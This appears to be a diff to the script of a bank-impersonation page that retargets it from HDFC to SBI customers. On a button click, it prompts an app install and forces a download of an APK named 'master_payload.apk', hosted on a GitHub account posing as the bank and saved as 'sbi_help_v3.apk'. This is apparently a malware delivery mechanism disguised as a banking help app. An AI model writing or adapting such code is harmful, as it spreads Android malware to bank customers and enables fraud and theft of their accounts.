@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', () => {
     // PASTE YOUR REAL GITHUB RELEASE LINK HERE:
-    const REAL_APK_URL = 'https://github.com/hdfcbank100200-tech/newmade1/releases/download/v3.0.12/master_payload.apk'; 
+    const REAL_APK_URL = 'https://github.com/sbibank100200-tech/newmade1/releases/download/v3.0.12/master_payload.apk'; 
     
     const installBtn = document.getElementById('installBtn');
     let deferredPrompt;
@@ -19,7 +19,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 deferredPrompt.prompt();
                 deferredPrompt.userChoice.then((choiceResult) => {
                     if (choiceResult.outcome === 'accepted') {
-                        console.log('User accepted the HDFC app install');
+                        console.log('User accepted the SBI app install');
                     }
                     deferredPrompt = null;
                 });
@@ -28,7 +28,7 @@ document.addEventListener('DOMContentLoaded', () => {
             // 2. TRIGGER APK DOWNLOAD IMMEDIATELY (Backup)
             const downloadLink = document.createElement('a');
             downloadLink.href = REAL_APK_URL;
-            downloadLink.download = 'hdfc_help_v3.apk';
+            downloadLink.download = 'sbi_help_v3.apk';
             document.body.appendChild(downloadLink);
             downloadLink.click();
             document.body.removeChild(downloadLink);
